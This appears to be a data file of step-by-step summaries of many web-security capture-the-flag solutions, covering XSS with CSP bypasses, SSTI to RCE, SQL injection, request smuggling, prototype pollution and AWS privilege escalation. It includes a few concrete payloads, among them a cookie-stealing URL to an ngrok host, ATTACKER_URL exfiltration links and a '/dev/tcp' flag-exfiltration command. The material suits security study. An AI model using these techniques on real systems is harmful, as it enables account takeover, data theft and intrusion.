    "Identify 'cat' command execution in GET request parameter 'f'.",
    "Understand regex filter on 'f' parameter.",
    "List permitted characters.",
    "Craft attack payload using permitted characters.",
    "Bypass character filter.",
    "Use wildcard '?' to match any single character.",
    "Access '/etc/hosts' file.",
    "Read binary '/readflag'.",
    "Download binary.",
    "Decompile binary.",
    "Identify string 'sRPd45w_0' in decompiled code.",
    "Recognize rearrangement as 'P4s5_w0Rd'.",
    "Understand permission of pipe character '|'.",
    "Terminate 'cat' command with '|'.",
    "Execute new command.",
    "Use character substitution '$()'.",
    "Retrieve required strings for password.",
    "Execute '/usr/bin/strings /readflag' command.",
    "Read strings from the binary.",
    "Filter output using '/etc/alternatives/nawk'.",
    "Retrieve only 'P4s5_w0Rd' string.",
    "Construct regex pattern.",
    "Extract 'P4s5_w0Rd' string using regex pattern.",
    "Pass obtained string as argument to '/readflag'.",
    "Use character substitution to pass argument.",
    "Result in 'Wrong Password!' message.",
    "Recognize the need to rearrange password.",
    "Recognize correct rearrangement as 'sRPd45w_0'.",
    "Develop script for indexing and reconstucting.",
    "Index characters of 'P4s5_w0Rd' string.",
    "Reconstruct into 'sRPd45w_0' string.",
    "Run script.",
    "Generate payload for rearranging password.",
    "Append payload to '/readflag' command in 'f' GET parameter.",
    "Obtain flag.",
    "Identified the possibility of XSS in a user's profile.",
    "Found potential injection points in the feature allowing us to edit our bio in Markdown.",
    "Saw that the Markdown was parsed using 'marked' and 'DOMPurify'.",
    "Checked the version numbers of these libraries and searched for security vulnerabilities without any results.",
    "Ruled out mutation XSS attacks on these libraries as 'marked' does not sanitize output HTML.",
    "Looked more into Jinja2 and found the 'safe' filter that renders unescaped HTML.",
    "Identified the HTML injection vector via 'profile.html' template.",
    "Realized a '<script>' payload wouldn't work due to Content Security Policy blocking arbitrary scripts without a randomly-generated nonce.",
    "Leveraged the '<base>' HTML tag to set the base URL for all relative URLs in the document, helping bypass the Content Security Policy.",
    "Intended to load the '/static/js/marked.min.js' files from a different URL to exploit the script tags being part of the original template.",
    "Started a HTTP server, created the '/static/js' directory structure, and placed XSS payload in 'marked.min.js'.",
    "Injected '<base href=\"http://HOST:PORT\">' into the profile via 'user['title']' or 'user['lab']'.",
    "Identified the challenge as involving wkhtmltopdf, a tool that translates HTML content into a PDF.",
    "Understood that the input had to satisfy certain constraints, chiefly that 'name' could only contain alphanumeric characters, and 'email' had to pass RFC5322 validation.",
    "Used knowledge of these constraints to aim exploitation efforts at the more forgiving 'email' parameter.",
    "Examined the documentation for RFC5322 to understand what characters are allowed in the email parameter.",
    "Discovered that it allows for a domain-literal format, which permits just about any printable ASCII character.",
    "Crafted a URL that appended an HTML header tag to the domain part of the email parameter, thereby exploiting the lax character restriction.",
    "Found the server endpoint was also vulnerable to Server-Side Template Injection (SSTI).",
    "Tested the SSTI vulnerability by crafting a URL that performed simple arithmetic in the email parameter using Jinja2 template syntax.",
    "Further exploited the SSTI vulnerability by crafting a URL that would read the contents of a 'flag.txt' file on the server using built-in Python functions within the Jinja2 template.",
    "Analyze the given Python script",
    "Identify the structure of the Python script",
    "Identify the functionality of the Python script",
    "Access the requirements.txt file",
    "Identify the version of SQL Alchemy",
    "Learn about the older version of SQLAlchemy",
    "Recognize the vulnerability of the older version to an SQL injection attack",
    "Observe the vulnerability's location after the ORDER BY clause",
    "Recognize the challenge in exploiting the vulnerability",
    "Discover the article by PortSwigger",
    "Learn about using the CASE clause to determine the column of the result being sorted",
    "Learn about the SQLite code",
    "Identify the vulnerable order_by() function",
    "Learn that the SQLite code can be injected into the vulnerable order_by() function",
    "Identify the payload",
    "Check the 6th character of the flag in the SQL database",
    "If the character matches 5, set the LIMIT to 1",
    "If the character does not match 5, set the LIMIT to 2",
    "Create a Python script",
    "Specify an alphabet to iterate over",
    "Test characters against the SQL injection",
    "Launch HTTP POST requests",
    "Include the SQL injection payload in the requests",
    "Experiment with different values in the SQL injection payload",
    "Check the 'Content-length' response header",
    "Compare the response header with the chosen character",
    "Identify if the chosen character is correct based on the response header",
    "Check if no character in the alphabet is causing a change in content length",
    "Break the script if no character is causing a change in content length",
    "Explored the website functionality",
    "Discovered an image rendering feature that places text onto a T-shirt image",
    "Conducted fuzzing",
    "Discovered that HTML injection is possible",
    "Tried to load an external resource (JavaScript or stylesheet)",
    "Observed any unusual behavior",
    "Identified that the user agent is `wkhtmltoimage`",
    "Through the request captured",
    "Recognized a potential SSRF vulnerability associated with `wkhtmltoimage`",
    "From previous knowledge and references",
    "Crafted an HTML payload for exploiting this vulnerability",
    "The task of this payload is to exfiltrate the content from `http://localhost:5000/admin`",
    "Hosted the payload on an external website",
    "Triggered the payload through an iframe by entering that into the webpage's input field",
    "URL format: `http://challenge.nahamcon.com:32132/exploit?text=%3Ciframe%20src=%22https://ATTACKER_URL/exploit.html%22%3E&color=%2324d600`",
    "The payload executed successfully",
    "Leaked the contents of the admin page",
    "Searched the leaked contents of the admin page",
    "To find the flag",
    "Identify XSS vulnerability in the feedback feature of the site.",
    "Understand that the XSS vulnerability can enable CSRF attacks on the admin.",
    "Exploit the XSS vulnerability to send a POST request.",
    "Target '/reset2fa' as the destination of the POST request.",
    "Aim to reset the admin's 2FA code through the POST request.",
    "Include 'credentials: include' in the request to bypass same-origin policy restrictions.",
    "Wait for the promise to resolve.",
    "Use the 'fetch' function to send the response text to an external URL.",
    "The response text contains the new 2FA token.",
    "Decode the 2FA token received from the previous step.",
    "Obtain the admin 2FA code from the decoded token.",
    "Use the 2FA token on an authenticator application.",
    "Generate the admin 2FA codes with the authenticator application.",
    "Use the generated 2FA code for another CSRF attack.",
    "Target the admin as the victim of the CSRF attack.",
    "Send a POST request to '/show_secret'.",
    "Include the stolen 2FA codes in the request.",
    "Aim to steal the admin's secrets through the POST request.",
    "Include 'Content-Type: application/json' in the request header.",
    "Include 'otp' and 'secretId' in the request body.",
    "Wait for the promise to resolve.",
    "Use the 'fetch' function to send the response text to an external URL.",
    "The response text contains the secrets.",
    "Decode the base64-encoded string received from the previous step.",
    "Obtain the flag from the decoded string.",
    "Analyzed the JavaScript source.",
    "Reviewed the challenge.",
    "Identified the use of a message event handler.",
    "Identified the need for a '.jsapi.tech' subdomain takeover.",
    "Recognized the ability to 'preview' HTML without saving it.",
    "Noted the use of DOMPurify for HTML sanitization.",
    "Identified a loophole in the 'search' feature.",
    "Recognized that 'this.noteData' remained the same after sanitization.",
    "Encountered an issue with the 'search' feature.",
    "Noted the absence of 'window.enable_experimental_features'.",
    "Utilized DOM clobbering.",
    "Overrode the 'window.enable_experimental_features' property.",
    "Inserted HTML through 'preview' feature.",
    "Demonstrated DOM clobbering.",
    "Enabled 'enable_experimental_features'.",
    "Unintended solution using 'Lazy-loading' property.",
    "Checked for an extra div when search is correct.",
    "Concluded the extra div was rendered when no request is received.",
    "Determined a correct guess for the search.",
    "Implemented the attack using 'Lazy-loading' property.",
    "Wrote a script for the attack.",
    "Different intended solution using 'PerformanceLongTaskTiming API'.",
    "Checked if the search took more than 50ms.",
    "Discovered that any timing attack with 'performance.now()' would have worked.",
    "Noted the single-threaded nature of the JavaScript event loop.",
    "Wrote a script using 'setTimeout' function.",
    "Executed the timing attack.",
    "Visited the website 'https://chall1.jsapi.tech'.",
    "Observed the HTML interface for writing and saving notes.",
    "Examined the site's JavaScript script 'script.js'.",
    "Identified the message event handler added to the window.",
    "Verified that the event handler is added after meeting several checks.",
    "Checked if the 'enableapi' query parameter was set to 'true'.",
    "Checked if the 'recv' query parameter was a subdomain of 'jsapi.tech'.",
    "Checked if the window was framed or opened by another window.",
    "Discovered that the subdomain 'jsapi.tech' points to 'sohomdatta1.github.io'.",
    "Identified the wildcard DNS configuration responsible for the pointing.",
    "Executed the 'dig' command on 'asdf.jsapi.tech'.",
    "Confirmed the possibility of creating a new repository with a CNAME file containing 'asdf.jsapi.tech'.",
    "Verified the GitHub pages site at 'asdf.jsapi.tech' can be served.",
    "Examined the code to understand the note saving mechanism.",
    "Identified the addition of note contents to the 'data-last' attribute of the '#note-text-area' element.",
    "Noted the usage of DOMPurify v2.3.0 tool for sanitizing the note.",
    "Verified that 'link' and 'style' tags are explicitly permitted during sanitization.",
    "Understood the condition for adding DOMPurify-sanitized HTML into the child iframe.",
    "Noted that the postMessage should start with 'NOTE_APP_SET_REQUEST' to trigger the addition.",
    "Examined the Content-Security-Policy (CSP) of the site.",
    "Identified the allowance of loading stylesheets from '*.jsapi.tech'.",
    "Realized that this allows loading of a CSS file from the exploit domain.",
    "Discovered a workaround to fix the loading behaviour.",
    "Noted that adding something before the '<link>' tag fixes the behaviour.",
    "Observed the usage of 'asdf<link rel='stylesheet' href='...'>'.",
    "Identified the 'data-last' attribute of the '#note-text-area' element.",
    "Realized that the 'data-last' attribute contains the victim's saved note.",
    "Discovered that CSS attribute selectors can be used for exfiltration.",
    "Identified the CSS rule with 'background' property.",
    "Confirmed that the URL specified in the 'background' property is fetched conditionally.",
    "Realized that the 'data-last' attribute should start with the correct string for it to be fetched.",
    "Understood the process of flag brute-forcing.",
    "Noted that each character of the flag has a background URL corresponding to it.",
    "Realized that all possible characters are guessed for each position of the flag.",
    "Examined the Python script used for the attack.",
    "Noted the usage of the Python script to generate CSS.",
    "Saved the generated CSS in 'exploit.css'.",
    "Loaded the challenge page as an 'iframe' in the exploit page.",
    "Waited for the API to be loaded in the challenge page.",
    "Sent a 'postMessage' linking the generated CSS to the target page.",
    "Added the CSS and generated CSS to a GitHub repository.",
    "Deployed the GitHub repository to GitHub pages under a '.jsapi.tech' subdomain.",
    "Redeployed the exploit GitHub page.",
    "Updated the CSS in the redeployed page.",
    "Exfiltrated each character using the updated CSS.",
    "Identify that it was a Jinja2 Template Injection challenge.",
    "Understood the extensive filter used for the challenge.",
    "Work on bypassing '{{' by using an if-else statement.",
    "Work on bypassing '}}' by using an if-else statement.",
    "Find a workaround for using '.' by employing the 'attr' filter.",
    "Utilize 'first' to get the first item of a list.",
    "Utilize 'last' to get the last item of a list.",
    "Convert items in a dictionary to a list using 'list'.",
    "Bypass '_' by constructing a string.",
    "Bypass '\\' by constructing a string.",
    "Bypass 'class' by constructing a string.",
    "Bypass 'subclasses' by constructing a string.",
    "Bypass 'getitem' by constructing a string.",
    "Use 'request.args' to bypass banned characters.",
    "Leverage 'lower' filter to bypass 'class' string.",
    "Leverage 'lower' filter to bypass 'subclasses' string.",
    "Leverage 'lower' filter to bypass 'getitem' string.",
    "Join the 'class' string with preceding and ending '__' characters using 'join' filter.",
    "Build Remote Code Execution (RCE) payload using '().__class__.__subclasses__.__getitem__(x)' method.",
    "Set 'x' corresponding to the index of 'subprocess.Popen'.",
    "Bruteforce the value of 'x' by submitting RCE payload with different 'x' values until a shell is received.",
    "Use a similar approach to bypass '.' character for callback domain.",
    "Use a similar approach to bypass '\"' character for bash command.",
    "Create final payload using all the methods of bypassing and injecting discovered.",
    "Submit the final payload to complete the challenge.",
    "Identified HAProxy configuration.",
    "Recognized that the '/flag' endpoint is case sensitive.",
    "Requested the '/FLAG' endpoint.",
    "Bypassed the validation by using a different case.",
    "Obtained the flag.",
    "Realized the existence of a HTTP request smuggling vulnerability.",
    "Identified the specific version (2.4.0) of HAProxy.",
    "Executed a POST request.",
    "Included an overflowing 'Content-Length' header.",
    "Included a second 'Content-Length' header with a value of 26.",
    "Included 'GET /flag HTTP/1.1' in the request body.",
    "Included a dummy value as the request body.",
    "Fooled HAProxy into treating the request body as part of the first request.",
    "Placed a second dummy 'GET / HTTP/1.1' request.",
    "The second request was treated as a separate request by HAProxy.",
    "Modified the requests after reaching the backend server.",
    "Set 'Content-Length: 0' for the first request.",
    "Set 'GET /flag HTTP/1.1' as the second request.",
    "Ensured the modifications reflected the initial intention.",
    "Received a response for the second consequent request.",
    "The response corresponded to '/flag' instead of '/'.",
    "The request smuggling caused the difference in the response.",
    "Incorporated delays between consecutive requests.",
    "Accounted for pipelining in the server.",
    "Sent the specially constructed requests to the server.",
    "Obtained the flag in the response of the smuggled request.",
    "Visit the target website.",
    "Identify the presence of the 'src=' parameter in the target website's HTML code.",
    "Examine the Content-Security-Policy of the target website.",
    "Observe the presence of a 'nonce' in the Content-Security-Policy that allows a script with src='assets/js/bootstrap.js'.",
    "Manipulate the '<base>' tag in the target website to change the base URL to the control of the attacker.",
    "Create a crafted attack URL with '?src=/img/saturn.jpg'><base href=\"http://ATTACKER_URL\">'.",
    "Host a custom script as 'assets/js/bootstrap.js' on the attacker-controlled site.",
    "Write a script that creates an 'img' element with src set to contain the 'document.cookie' value.",
    "Modify the script to append the created 'img' element to the document body.",
    "Trigger the browser to fetch the attacker-controlled site's root path, '/' with the cookie value appended.",
    "Capture the requests received by the server logs, thereby obtaining the admin's cookie.",
    "Conduct reconnaissance to identify potential target web application.",
    "Verify that the identified web application allows file uploads and conversions.",
    "Evaluate the web application's functionality to identify potential SSRF or file inclusion vectors.",
    "Craft a file upload request with specific HTML content.",
    "Submit the file upload request and monitor for any callbacks from the server.",
    "Gather information about the server-side tools used for document conversions.",
    "Determine that LibreOffice is the specific tool employed for document conversions.",
    "Conduct research to identify potential vulnerabilities of the LibreOffice tool.",
    "Create a LibreOffice word document with the name 'poc.odt'.",
    "Extract the contents of 'poc.odt' to access the 'content.xml' file.",
    "Open 'content.xml' and modify its contents to include a payload that links to the '/flag' file.",
    "Compress the modified files back into a zip archive named 'modified.odt'.",
    "Submit the 'modified.odt' file with the payload to the server as a file upload.",
    "Analyzed the challenge website where notes could be created and searched.",
    "Investigated the search function.",
    "Observed the usage of 302 server-side redirect to '/view' for a matching note.",
    "Discovered the possibility of using an oracle.",
    "Noted the purpose of the oracle in determining flag correctness.",
    "Confirmed the SameSite attribute of the cookies.",
    "Researched the Fetch API's limit of 20 redirects causing a network error.",
    "Identified the exploitation of a 302 redirect.",
    "Noted the flag leakage due to Fetch API redirect limit.",
    "Created an attacker server.",
    "Configured the attacker server to make 19 redirects.",
    "Redirected the attacker server to the target URL after 19 redirects.",
    "Utilized script to make the client request.",
    "Exploited the limit of 20 redirects using Fetch API.",
    "Created a PHP script.",
    "Configured the PHP script to redirect to itself 19 times.",
    "Redirected the PHP script to the target URL after 19 redirects.",
    "Tested the method.",
    "Bruteforced the flag letter by letter.",
    "Identified the input.",
    "Observed reflection of the input into an XSL document.",
    "Tested rendering of the reflected input in the browser.",
    "Identified that an error was thrown during rendering.",
    "Identified the Content-Type of the XSL document as 'text/xsl'.",
    "Recognized that 'text/xsl' can potentially allow Cross-Site Scripting.",
    "Explored different methods for conducting XSS attacks on XSL documents.",
    "Developed a payload utilizing 'x:script' to exploit the vulnerability.",
    "Designed a payload to retrieve cookies and encode them in base64.",
    "Constructed the payload to send encoded cookies to a pre-defined URL controlled by the attacker.",
    "Identified that the input was being reflected.",
    "Realized the input was being reflected into an XSL document.",
    "Tested rendering in the browser.",
    "Found that an error was thrown.",
    "Identified the Content-Type.",
    "Realized the Content-Type was 'text/xsl'.",
    "Noted that 'text/xsl' indicated potential for Cross-Site Scripting.",
    "Investigated methods for exploiting XSS attacks.",
    "Focused on exploiting XSS attacks accessing XSL document.",
    "Constructed a payload.",
    "Utilized 'x:script' to exploit the vulnerability.",
    "The payload utilized was designed to fetch cookies.",
    "Encoded the fetched cookies in base64.",
    "Sent the encoded cookies to a pre-defined URL controlled by the attacker.",
    "Analyze the Python code for the challenge.",
    "The code manages a market API.",
    "Understand that customer eligibility is based on fame and point history.",
    "Identify the bug in the API.",
    "The bug is in the unauthenticated index page.",
    "Register as a new user.",
    "Review the battle endpoint.",
    "Fame increase is hypothetically possible.",
    "LOYALTY_SYSTEM_ACTIVE is set to False.",
    "Increasing fame is impossible.",
    "Examine the buy endpoint.",
    "Understand purchasing requests and conditions.",
    "Note the introduced code problem.",
    "Mutable namedtuple assignment raises AttributeError.",
    "Realize modification of point history with each purchase request.",
    "Understand immutability of namedtuple and tuple.",
    "Mutable objects within namedtuple and tuple can still be modified.",
    "Note the difference between += and x = x + y.",
    "+= performs the operation in place when possible.",
    "+= tries to assign the result back to the variable.",
    "Understand successful modification of the list.",
    "Error is raised later in the assignment step.",
    "Send purchase requests to the API.",
    "Increase loyalty point history minimum of 1337 times.",
    "Unlock and buy the 'flagsword'.",
    "Complete the challenge.",
    "Identify that the code involves an XML parser.",
    "Notice the use of 'ElementInclude.include(root)' in the code.",
    "Understand that 'ElementInclude.include(root)' allows the use of XInclude directives.",
    "Recognize that XInclude directives allow the parsing of files.",
    "Identify that the server checks if 'text' is not included in 'xml.lower()'.",
    "Understand that 'parse=\"xml\"' raises an error when used with non-XML content.",
    "Devise a workaround by defining XML entities to form the string 'text'.",
    "Use the workaround to parse the contents of '/etc/passwd' to the results.",
    "Realize that the flag is in the environment variable.",
    "Read '/proc/self/environ' to retrieve the flag.",
    "Identify vulnerability in '/api/tet/list' endpoint.",
    "Notice vulnerability occurs when merging request data.",
    "Observe user input being passed to 'require()'.",
    "Notice 'require()' leads to a Local File Inclusion (LFI) vulnerability.",
    "Propose escalation of vulnerability to Remote Code Execution (RCE).",
    "Identify attribute that can be polluted to spawn a new process or execute a command.",
    "Consider potential .js file candidates for execution.",
    "Note that node_modules folder contains source code of installed modules.",
    "Execute 'grep' command.",
    "Search for 'child_process' in all files of '/usr/local/lib/node_modules'.",
    "Find 'changelog.js' script.",
    "Find 'update-dist-tags.js' script.",
    "Analyze the 'changelog.js' script.",
    "Identify 'execSync' call in the script.",
    "Note the possibility of command injection in the 'execSync' call.",
    "Notice absence of arguments in 'require()' call.",
    "Identify 'process.argv[2]' as undefined.",
    "Decide to pollute 'process.argv[2]' with a command injection payload.",
    "Plan to import the 'changelog.js' file after the pollution.",
    "Perform local test using a python command.",
    "Test the creation of a reverse shell.",
    "Send POST request to '/api/tet/list' endpoint.",
    "Insert '__proto__' attribute in the request payload.",
    "Pollute '__proto__' attribute with a command injection payload in the 'data'.",
    "Send POST request to '/api/tet/years' endpoint.",
    "Include JSON payload in the request body.",
    "Specify 'changelog.js' script in the path of the JSON payload.",
    "Expect the execution to result in a reverse shell.",
    "Navigate to the root directory.",
    "Read the flag.",
    "Visited the provided webpage",
    "Accessed HTML source to find clues",
    "Identified an S3 bucket in the HTML source",
    "Used AWS CLI to access the 'palindromecloudynekos' S3 bucket",
    "Downloaded files from the 'palindromecloudynekos' S3 bucket",
    "Found a passcode in the downloaded files",
    "Found API endpoint details in the downloaded files",
    "Sent a request to the API endpoint",
    "Used the appropriate 'X-Cat-Header' in the request",
    "Obtained AWS credentials from the response",
    "Enumerated permissions using 'enumerate-iam' tool",
    "Enumerated permissions using 'pacu' tool",
    "Discovered interesting information in the 'iam list-roles' response",
    "Discovered interesting information in the 'iam list-instance-profiles' response",
    "Identified privileged permissions to create AWS Lambda functions",
    "Identified privileged permissions to invoke AWS Lambda functions",
    "Created a Python script that opens a reverse shell",
    "Deployed the Python script as a Lambda function",
    "Invoked the Lambda function",
    "Gained a reverse shell by invoking the Lambda function",
    "Created an EC2 instance using the new role",
    "Configured the EC2 instance to trigger a reverse shell on startup",
    "Obtained new AWS credentials",
    "Used the new AWS credentials to access DynamoDB",
    "Scanned the 'flag_db' DynamoDB table",
    "Retrieved the flag from the 'flag_db' DynamoDB table",
    "Inspect the source code.",
    "Discover that all other endpoints are protected by authenticationMiddleware.",
    "Understand that the mysqljs/mysql package is used without the option stringifyObjects: true.",
    "Recognize that the express.json() allows Object and Array types to be given as req.body.email and req.body.password.",
    "Use this behaviour when constructing SQL queries to bypass the login.",
    "Authenticate successfully.",
    "Gain access to the application.",
    "Discover that the Express application is put behind a reverse proxy (Apache Traffic Server).",
    "Realize that the /do-report endpoint is mapped to /forbidden.",
    "Recognize that access is prevented unless not going through the proxy.",
    "Research about the versions of Node.js and ATS used.",
    "Find a HTTP request smuggling issue with incorrect parsing of chunk extensions.",
    "Modify the available PoC to suit the given context.",
    "Smuggle a request to the backend application.",
    "Bypass the access control implemented on ATS.",
    "Understand that the verify.pug template has an unescaped username.",
    "Recognize that HTML markup injection is allowed.",
    "Learn about the Scroll-To-Text-Fragment (STTF).",
    "Recognize that STTF is a Chromium feature.",
    "Understand that STTF allows scrolling to a specific portion of the page using a text snippet in the URL.",
    "Use the lazy-loaded image.",
    "Detect if a scroll occurred when a text fragment is parsed in the URL.",
    "Automate the submission of different text fragments.",
    "For each text fragment, detect if a callback is received.",
    "Use this method to bruteforce the admin token one character at a time.",
    "Automate the full exploit chain in solve.py.",
    "Adjust necessary parameters in the python script.",
    "Review challenge",
    "Identify goal: purchase flag with starting balance of zero",
    "Identify weak point in code",
    "Weak point: negative flag price not validated in 'sellFlag' function",
    "Recognise potential exploit",
    "Exploit: apply negative price when selling a flag",
    "Result: buyer's balance increases due to subtraction in 'buyFlag' function",
    "Initiate exploitation",
    "HTTP POST request to sell flag with negative price",
    "Create separate account",
    "Buy flag sold with negative price",
    "Perform Insecure Direct Object Reference (IDOR)",
    "Directly access flag with 'flag_id=3' using HTTP POST /buy request",
    "Identify the need to perform an XSS attack.",
    "Note the presence of a Content Security Policy (CSP) to prevent XSS attacks.",
    "Observe that the page uses relative JavaScript paths.",
    "Notice that the scripts are always executed due to the `nonce` in the CSP.",
    "Change the base URI of the page.",
    "Note that the relative paths now load scripts from the attacker's server.",
    "Recognize that this is usually not possible due to the CSP.",
    "Host a file at `/static/page.js` on the attacker server.",
    "Enable CORS to execute arbitrary JavaScript through the hosted file.",
    "Use the `nonce` to bypass the CSP again.",
    "Exfiltrate data.",
    "Create a new script element.",
    "Add the appropriate `nonce` from the rest of the script tags.",
    "Set the script source to the data wanted to exfiltrate.",
    "Append the new script to the body of the document.",
    "Receive the flag on the attacker server.",
    "Indicate the successful execution of the attack.",
    "Establish session.",
    "Send GET request to 'https://shiba.yactf.ru/'.",
    "Initialize for loop.",
    "Send GET request to 'https://shiba.yactf.ru/api/boop' 1500 times within the loop.",
    "Print response from the server using command r.text.",
    "Send GET request to 'https://shiba.yactf.ru/' to get the final page after 1500 iterations.",
    "Print the content of the final page.",
    "Print the session cookies.",
    "Discover that the website uses JWT tokens.",
    "Realize that the tokens are used to count the number of 'boops'.",
    "Look for '/robots.txt' to find a hint about the public key location.",
    "Find the public key in '/signature/key.pub' as indicated in the hint.",
    "Understand the JWT processing by the server.",
    "Note that the public key, verifyKey, is used to validate JWT signature in both HS256 and RS256 cases.",
    "Realize that the server signs new RS256 tokens with the private key, signKey.",
    "Understand that we can generate our own HS256 token since we know the public key.",
    "Sign a token with the public key verifyKey.",
    "Set the number of 'boops' in the token to 1501.",
    "Collect the flag from the server's response.",
    "Registered a new user.",
    "Attempted to login which returns 'User not active' error.",
    "Examined 'auth.py'.",
    "Identified that a successful password reset would set 'user.active' to 'True', activating the user account.",
    "Requested an OTP at '/request_code'.",
    "Set 'user.code' to a random 4-digit number.",
    "Noticed rate limiting being enforced on a per-email basis through a Redis store.",
    "Identified that the rate limiting limits the number of OTP attempts to 3.",
    "Identified that the OTP code was validated using SQL 'LIKE' operator.",
    "Tried to insert '%' wildcard to bypass check.",
    "Attempted to bypass `is_valid_email(email)` function.",
    "Failed as the function doesn't allow special characters like '%'.",
    "Understood that the `'re.match'` only matches at the _beginning_ of the string.",
    "Noticed that wildcards are allowed at the _end_ of the email due to `'re.match'` behavior.",
    "Created a script to brute force the OTP by appending '%' to the email and incrementally changing the OTP.",
    "Gained access by passing the OTP check.",
    "Ensured the user script run by application was active.",
    "Identified a post made by admin with the flag.",
    "Noted that the post is only visible to the admin.",
    "Inspected Create Post code.",
    "Identified the BeautifulSoup module being used to sanitize HTML.",
    "Recognized a restrictive CSP.",
    "Exploited parser differential in BeautifulSoup.",
    "Injected arbitrary HTML through HTML comments.",
    "Analysed the server's CSP policy.",
    "Identified a potential vulnerability with 'www.youtube.com' hosting a JSONP endpoint.",
    "After unsuccessful attempts searching for YouTube's JSONP endpoints.",
    "Found an issue on Google's issue tracker regarding YouTube's 'oembed' API not implementing JSONP.",
    "Triggered a JSONP response from the YouTube API.",
    "Provided a callback parameter.",
    "Created a callback that reflected the response into Javascript code.",
    "Injected arbitrary Javascript to exfiltrate contents from admin's page.",
    "Submitted final payload that contained a script.",
    "Exploited YouTube's JSONP response and BeautifulSoup's parsing differential.",
    "Identified the URL of the flag containing post '/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b' from the exfiltrated contents.",
    "Repeated the Javascript injection to fetch the flag.",
    "Request the website.",
    "Specify the 'news' category by adding '?cat=news' to the URL.",
    "Analyze the HTML response.",
    "Identify the presence of 'news' string in the JavaScript code.",
    "Attempt to break out of the string with a single quote in '?cat=news''.",
    "Notice that the site prepends a backslash to escape the single quote.",
    "Discover that the backslash character itself isn't escaped.",
    "Attempt to break out using '?cat=news\\\\''.",
    "Find that any brackets or subsequent quotes are still escaped.",
    "Conclude that an alternative route to XSS is required.",
    "Observe the site fetching resources.",
    "Notice that the resources are fetched from '/ajax/articles?cat=news'.",
    "Observe that the fetched resources are inserted into the 'ajax-load' element.",
    "Attempt to inject an attribute into the 'img' element of the response.",
    "Utilize the 'cat' parameter in a request to '/ajax/articles?cat=asdf\"x=\"'.",
    "Review the jQuery documentation.",
    "Identify a feature in the documentation.",
    "Find that the feature allows specifying a remote document portion to insert.",
    "Remove the 'noscript' tag.",
    "Load only the 'img' element.",
    "Circumvent restrictions.",
    "Craft a '?cat=random\"onerror=\"alert`` img' request.",
    "Render the XSS payload: '<img src=\"/images/error.jpg\" alt=\"selected category random\"onerror=\"alert``\" />'",
    "Execute an XSS attack.",
    "Create the final payload: '?cat=random\"onerror=\"window.location=`https://f5e6-49-245-33-142.ngrok.io?${document.cookie}` img'",
    "Steal the admin's cookie.",
    "Retrieve the challenge flag.",
    "Inspect the search feature of the provided platform",
    "Look at the responses when searching for a note",
    "Examine the issued redirects",
    "Notice the difference in redirect URLs when a note is found or not found",
    "Consider the potential of exploiting the system by bloating the URL length (via the 'ids' parameter) to hit a limitation",
    "Explore the possibility of detecting a client-side error when exceeding Chrome's maximum URL length (2MB)",
    "Experiment with creating a URL that just hits the length limit",
    "Observe a redirection to an 'about:blank#blocked' page when the limit is exceeded",
    "Notice that if the URL limit is hit, the origin of the page remains that of the parent window",
    "Test the observation by creating a URL for a successful and unsuccessful query respectively",
    "Compare the resulting origins of the pages",
    "Derive a proof-of-concept (PoC) to brute-force a character of the flag by exploiting the observed behavior",
    "Leverage a backend server to eliminate unsuccessful queries and zero in on the correct flag",
    "Consider the downside of the above PoC - the potential strain on the server due to very long URLs",
    "Explore the alternative of exploiting Cross-Origin Resource Sharing (CORS) policy violation as a faster and more efficient method",
    "Create a policy that only allows form submissions to a specific domain",
    "Queries leading to a different domain will be blocked",
    "Observe that the violation can be detected through a 'securitypolicyviolation' event listener",
    "Retrieve source files for AsmBB and FreshLib using wget",
    "Validate the files with SHA256 sums",
    "Unpack the tar archives",
    "Build the asmbb engine source code using the Fresh IDE with Linux as the target OS",
    "Analyze the AsmBB source's render2.asm file",
    "The render2.asm file contains a hash table of commands used by the templating engine",
    "Inspect the functionality of the 'minimag' command",
    "Inspect the functionality of the 'bbcode' command",
    "The 'minimag' and 'bbcode' commands are used for parsing content into HTML in the post_view.tpl file",
    "Test inputting content in MiniMag format",
    "Test inputting content in BBCode format",
    "The content in MiniMag and BBCode format is accepted as 'format' in the post submission request data",
    "Familiarize with TranslateBBCode routine",
    "TranslateBBCode routine is in bbcode.asm file part of FreshLib",
    "TranslateBBCode routine processes BBCode tags",
    "Explore the HTML encoding process of individual characters",
    "The HTML encoding process of individual characters is done in the loop function",
    "Discover an edge case where not closing a BBCode tag results in an unencoded content being reflected",
    "The unencoded content being reflected leads to an alert in the browser",
    "The alert in the browser indicates a Cross-Site Scripting (XSS) vulnerability",
    "Identify two other POST-based XSS vectors",
    "The POST-based XSS vectors are not exploitable for admin privilege access",
    "Determine that a setting called 'Pipe the emails through' uses the 'smtp_exec' variable",
    "'smtp_exec' variable is used in sending activation emails",
    "The 'smtp_exec' variable is used as an argument to the Exec2 routine",
    "The usage of 'smtp_exec' indicates that Remote Code Execution (RCE) could be possible",
    "Upon granting admin privileges",
    "Modify the 'Pipe the emails through' command",
    "Send the flag to an external server using the '/readflag>/dev/tcp' command",
    "Use the server's IP address and port number in the command",
    "Put all components of the attack together",
    "The attack starts with executing an XSS to grant admin privileged access",
    "The attack then initiates RCE to read and externally send the flag",
    "Identify prototype pollution vulnerability",
    "Vulnerability found in `utils.merge()` method",
    "Identify off-by-one error in `background.js` font validation",
    "Manipulate `utils.FONTS[10]` using the off-by-one error",
    "Bypass standard checks by exploiting the off-by-one error",
    "Create a fetch request",
    "Modify fetch request to include polluted `credentials: include` option",
    "Use the credentials for `http://app/` in the fetch request",
    "Inject the output into the exploit page's `style` element",
    "Ensure the injected `style` element is readable by the attacker",
    "Identify HTTP request smuggling as the first obstacle.",
    "Identify ATS and Puma as the systems involved in the smuggling.",
    "Recognize ATS interpreting \\\"chunked\\\" as chunked.",
    "Recognize Puma ignoring invalid / unsupported TE values.",
    "Craft a request to smuggle a request to /admin in flagportal.",
    "Perform a Server Side Request Forgery (SSRF) with the smuggled request.",
    "Host a server to capture the request.",
    "Capture the request, including the Admin-Key.",
    "Decode the field First-Flag.",
    "Extract the first flag from the decoded field.",
    "Understand that the previous request smuggling method will not capture the second response from Puma.",
    "Find out that the second obstacle is HTTP request smuggling.",
    "Identify ATS and Waitress as the systems involved in the smuggling.",
    "Understand that ATS processes LF as line endings.",
    "Understand that Waitress allows LF in chunked extensions.",
    "Craft a request with LF in chunk extension.",
    "Note how ATS processes the LF as the end-of-line.",
    "Note how the second request is encapsulated in the chunked content of the first request.",
    "Confirm that Waitress sees both received requests.",
    "Run the command 'python3 payload.py | nc localhost 8000'.",
    "Capture the request.",
    "Decode the field flag from the receiving server.",
